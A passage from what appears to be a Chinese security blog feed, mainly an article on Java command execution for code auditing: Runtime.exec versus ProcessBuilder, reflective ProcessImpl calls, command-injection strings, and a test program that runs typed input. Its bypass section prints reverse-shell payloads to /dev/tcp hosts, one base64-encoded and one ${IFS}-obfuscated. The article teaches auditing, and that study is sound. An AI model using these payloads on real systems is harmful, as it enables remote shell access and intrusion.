class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestTemplatesImpl的源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestTemplatesImpl</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行</title>
      <link href="/article/java-rce/"/>
      <url>/article/java-rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.buaq.net/go-137550.html">个人博客-实战中关于Runtime反弹shell的Bypass</a></li><li><a href="https://www.freebuf.com/articles/web/427845.html">freebuf-Java代码审计之命令执行漏洞详解</a></li></ol><h1>命令执行</h1><p>Java中执行系统命令主要通过<code>java.lang.Runtime</code>类的<code>exec</code>方法实现, 允许Java程序与底层操作系统交互</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一段能打开计算器的程序, 这里的命令执行并非直接使用系统中的bash或cmd, 而是由Java本身实现的, 这也导致了一些特定的行为和限制, 在代码审计部分会提到</p><h2 id="Runtime-exec方法"><a class="header-anchor" href="#Runtime-exec方法">¶</a>Runtime.exec方法</h2><p>Runtime类提供了多个exec方法重载，用于不同的执行场景</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在单独的进程中执行指定的字符串命令 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span> </span><br><span class="line"><span class="comment">//在单独的进程中执行指定的命令和参数 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray)</span> </span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的命令和参数 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp)</span> </span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的命令和参数 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span> </span><br><span class="line"><span class="comment">//在具有指定环境的单独进程中执行指定的字符串命令 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp)</span> </span><br><span class="line"><span class="comment">//在具有指定环境和工作目录的单独进程中执行指定的字符串命令 </span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br></pre></td></tr></table></figure><h1>命令执行方式</h1><h2 id="Runtime-exec与ProcessBuilder"><a class="header-anchor" href="#Runtime-exec与ProcessBuilder">¶</a>Runtime.exec与ProcessBuilder</h2><p><code>Runtime.exec</code>的底层实现实际上是基于<code>ProcessBuilder</code>类的</p><p>使用<code>Runtime.getRuntime().exec</code>方法这个方式进行命令执行的最终会来到<code>ProcessBuilder#start</code>方法中进行命令执行</p><p>每个<code>ProcessBuilder</code>实例管理进程属性的集合，<code>start()</code>方法使用这些属性创建一个新的Process实例，并且可以从同一实例重复调用，以创建具有相同或相关属性的新子进程</p><p>与<code>Runtime.exec</code>不同，<code>ProcessBuilder</code>不支持以字符串形式传入命令，只能拆分成List或者数组的形式传入，这在一定程度上提供了更好的安全性</p><h2 id="第三方库"><a class="header-anchor" href="#第三方库">¶</a>第三方库</h2><p>除了Java原生的命令执行方式，还有一些第三方库提供了更加强大和安全的命令执行能力：</p><ol><li><strong>Apache Commons Exec</strong>：提供了更健壮的API来处理命令行执行，能够更好地处理进程的输出和错误流，避免死锁，并提供异步执行和结果处理的能力</li><li><strong>ZT-Exec</strong>：提供了简洁的流式API，易于使用和理解，支持同步和异步执行，能够方便地处理命令的输出</li></ol><h1>代码审计</h1><h2 id="exec-和exec-String"><a class="header-anchor" href="#exec-和exec-String">¶</a>exec()和exec(String[])</h2><p><code>exec()</code>方法在执行命令的时候，传入的参数有字符串和字符串数组两种形参, 分别测试看有什么区别和寻找利用方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心就这两个, 如果不想手动操作就用文章最后的那个很长的java代码</span></span><br><span class="line"><span class="keyword">private</span> Process <span class="title function_">javaExec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process1</span> <span class="operator">=</span> Runtime.getRuntime().exec(command)</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process2</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接下结论, 测试过程可以自己测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRuntime().exec()</span><br><span class="line">无法执行部分命令, 且拼接命令会报错</span><br><span class="line"></span><br><span class="line">getRuntime().exec(String[])</span><br><span class="line">正常执行命令且可以正常用管道符拼接</span><br></pre></td></tr></table></figure><h3 id="getRuntime-exec"><a class="header-anchor" href="#getRuntime-exec">¶</a>getRuntime().exec()</h3><p>对执行过程进行同动态调试, 去向均为<code>exec(cmdarray, envp, dir)</code>, 查看该函数实现, 发现经过了<code>StringTokenizer</code>函数的处理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringTokenizer</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> <span class="title class_">String</span>[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进处理, 发现对传入的命令进行格式化, 将传入的字符串<code>str</code>按照默认的空白分隔符进行分割;</p><p><code>String[] cmdarray = new String[st.countTokens()];</code>的作用是创建一个字符串数组<code>cmdarray</code>，其长度等于<code>StringTokenizer</code>对象<code>st</code>中分割后的子字符串数量，最终命令变成了<code>[&quot;calc&amp;ping&quot;,&quot;baidu.com&quot;]</code>传入了<code>exec(cmdarray, envp, dir)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructs a string tokenizer for the specified string. The</span></span><br><span class="line"><span class="comment"> * tokenizer uses the default delimiter set, which is</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;&quot;&amp;nbsp;&amp;#92;t&amp;#92;n&amp;#92;r&amp;#92;f&quot;&lt;/code&gt;: the space character,</span></span><br><span class="line"><span class="comment"> * the tab character, the newline character, the carriage-return character,</span></span><br><span class="line"><span class="comment"> * and the form-feed character. Delimiter characters themselves will</span></span><br><span class="line"><span class="comment"> * not be treated as tokens.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   str   a string to be parsed.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> NullPointerException if str is &lt;CODE&gt;null&lt;/CODE&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">StringTokenizer</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终交给<code>ProcessBuilder</code>去执行，命令被错误的分割成<code>[&quot;calc&amp;ping&quot;, &quot;baidu.com&quot;]</code>，Java会尝试执行第一个参数<code>calc&amp;ping</code>，视为可执行程序名，<code>calc&amp;ping</code>不是一个有效程序，因此抛出<code>IOException: Cannot run program &quot;calc&amp;ping&quot;</code></p><h3 id="getRuntime-exec-String"><a class="header-anchor" href="#getRuntime-exec-String">¶</a>getRuntime().exec(String[])</h3><p>如果是<code>exec(String[])</code>呢, 最终命令是<code>[&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&amp;ping&quot;, &quot;baidu.com&quot;]</code>, Java调用<code>cmd.exe</code>，并传递参数<code>/c</code>和后续参数<code>calc&amp;ping baidu.com</code></p><p><code>cmd.exe</code>会将<code>calc&amp;ping baidu.com</code>整体视为一个字符串，并按照 Shell 规则解析其中的<code>&amp;</code>符号，将<code>calc&amp;ping baidu.com</code>解析为两条命令，故而执行成功</p><h2 id="exec和ProcessBuilder"><a class="header-anchor" href="#exec和ProcessBuilder">¶</a>exec和ProcessBuilder</h2><p>结合前面的, 这两个去向均为<code>exec(cmdarray, envp, dir)</code>, 在该函数实现处追踪<code>return exec(cmdarray, envp, dir);</code>的exec</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdarray)  </span><br><span class="line">        .environment(envp)  </span><br><span class="line">        .directory(dir)  </span><br><span class="line">        .start();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到了<code>ProcessBuilder</code>, 对其进行追踪</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);  </span><br><span class="line">    <span class="keyword">for</span> (String arg : command)  </span><br><span class="line">        <span class="built_in">this</span>.command.add(arg);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据描述: The <code>start()</code> method creates a new Process instance with those attributes. 那就是来到了<code>ProcessBuilder#start()</code></p><h2 id="ProcessBuilder"><a class="header-anchor" href="#ProcessBuilder">¶</a>ProcessBuilder</h2><p><code>ProcessBuilder</code>命令执行漏洞的核心在于通过ProcessBuilder类直接构造并执行系统命令时，若未对用户输入参数进行严格过滤或拆分，攻击者可注入恶意命令实现任意代码执行</p><p><code>ProcessBuilder</code>不支持以字符串形式传入命令，只能拆分成List或者数组的形式传入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>（<span class="string">&quot;ProcessBuilder&quot;</span>.equals(execType))&#123; </span><br><span class="line">    Processprocess = newProcessBuilder（<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,command).start();</span><br><span class="line">    stdout = readStream(process.getInputStream());</span><br><span class="line">    stderr = readStream(process.getErrorStream());</span><br><span class="line">    process.waitFor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将用户输入的参数传入到<code>ProcessBuilder</code>进行命令执行, 那拼接恶意命令就行了</p><h2 id="ProcessImpl"><a class="header-anchor" href="#ProcessImpl">¶</a>ProcessImpl</h2><p>跟进<code>ProcessBuilder.start()</code>方法，<code>ProcessBuilder.start()</code>是Java中启动外部进程的核心方法，其底层实现最终通过调用<code>ProcessImpl.start()</code>完成操作系统级别的进程创建</p><p>ProcessImpl是Java中Process抽象类的具体实现类 ，其设计目的是为<code>ProcessBuilder.start()</code>方法提供底层支持，用于创建和管理操作系统进程</p><p>但是它的构造函数被声明为private, 我们直接用反射的方式即可绕过</p><p>此处为大佬的代码, 我直接拿来用了, 详情见参考文章1</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImplExamples</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">        String[] cmdarray = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmdarray, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>漏洞利用</h1><h2 id="exec-String-利用"><a class="header-anchor" href="#exec-String-利用">¶</a>exec(String)利用</h2><p>那<code>exec(String)</code>怎么去进行漏洞利用呢？可以利用Shell的解析逻辑实现命令注入，直接拼接<code>cmd /c</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /c calc&amp;ping baidu.com</span><br></pre></td></tr></table></figure><h2 id="ProcessBuilder利用"><a class="header-anchor" href="#ProcessBuilder利用">¶</a>ProcessBuilder利用</h2><p>拼接即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping baidu.com &amp; calc</span><br></pre></td></tr></table></figure><h2 id="ProcessImpl利用"><a class="header-anchor" href="#ProcessImpl利用">¶</a>ProcessImpl利用</h2><p>拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping&amp;calc</span><br></pre></td></tr></table></figure><h1>限制与绕过技巧</h1><h2 id="执行环境限制"><a class="header-anchor" href="#执行环境限制">¶</a>执行环境限制</h2><p>Runtime.exec执行外部命令的原理是fork一个单独的进程，然后直接执行这个命令。exec(String command)这个方法无法指定shell为命令上下文环境，因此它不识别<code>|</code>、<code>&gt;</code>等shell中的复杂命令</p><p>这就是为什么执行<code>ls -l /opt</code>和<code>ls -l /opt | grep tomcat</code>两个命令输出结果可能完全一样—因为管道符<code>|</code>没有被识别</p><h2 id="绕过方法"><a class="header-anchor" href="#绕过方法">¶</a>绕过方法</h2><ol><li><p><strong>使用sh -c执行复杂命令</strong>：通过调用shell来执行包含管道、重定向等复杂操作的命令</p></li><li><p><strong>编码方式绕过</strong>：使用Base64编码命令，然后解码执行</p></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>特殊变量替代空格</strong>：使用<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>或<code>$IFS</code>替代命令中的空格</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash$&#123;IFS&#125;-c$&#123;IFS&#125;bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;$&#123;IFS&#125;/dev/tcp/192.168.153.1/8000&lt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>使用参数数组形式</strong>：这是最推荐的绕过方式，既安全又有效</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/8000 0&gt;&amp;1&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><h1>测试程序</h1><p>搓了个很烂很烂的小程序用于测试, 它会将你的输入作为参数用两种方式进行执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaExecTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">javaExec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="literal">null</span> || command.trim().isEmpty()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;错误: 命令不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n执行命令: &quot;</span> + command);</span><br><span class="line">        System.out.println(repeatChar(<span class="string">&#x27;=&#x27;</span>, <span class="number">50</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式一：字符串执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n方式一: 字符串执行&quot;</span>);</span><br><span class="line">        System.out.println(repeatChar(<span class="string">&#x27;-&#x27;</span>, <span class="number">25</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process1</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            printProcess(process1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;方式一执行失败: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式二：字符串数组执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n方式二: 字符串数组执行&quot;</span>);</span><br><span class="line">        System.out.println(repeatChar(<span class="string">&#x27;-&#x27;</span>, <span class="number">25</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmdArray = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process2</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">            printProcess(process2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;方式二执行失败: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(repeatChar(<span class="string">&#x27;=&#x27;</span>, <span class="number">50</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printProcess</span><span class="params">(Process process)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">hasOutput</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">hasError</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取标准输出流</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!hasOutput) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;输出:&quot;</span>);</span><br><span class="line">                    hasOutput = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;   &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取错误输出流</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">errorReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = errorReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!hasError) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;错误:&quot;</span>);</span><br><span class="line">                    hasError = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;   &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待进程执行完成</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;执行成功 (退出码: &quot;</span> + exitCode + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;执行完成但有错误 (退出码: &quot;</span> + exitCode + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果没有输出也没有错误</span></span><br><span class="line">            <span class="keyword">if</span> (!hasOutput &amp;&amp; !hasError) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;命令执行完成，无输出内容&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取命令输出时出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 辅助方法：生成重复字符的字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">repeatChar</span><span class="params">(<span class="type">char</span> c, <span class="type">int</span> count)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            sb.append(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Java 命令执行测试程序&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;支持两种执行方式比较&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;输入 &#x27;exit&#x27; 退出程序&quot;</span>);</span><br><span class="line">        System.out.println(repeatChar(<span class="string">&#x27;*&#x27;</span>, <span class="number">50</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">consoleReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in))) &#123;</span><br><span class="line">            String input;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;\n请输入命令 &gt; &quot;</span>);</span><br><span class="line">                input = consoleReader.readLine();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">trimmedInput</span> <span class="operator">=</span> input.trim();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (trimmedInput.isEmpty()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;exit&quot;</span>.equalsIgnoreCase(trimmedInput)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;\n程序退出，再见！&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    javaExec(trimmedInput);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;执行命令失败: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取输入时出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSEC搭建</title>
      <link href="/article/JavaSec-pre/"/>
      <url>/article/JavaSec-pre/</url>
      
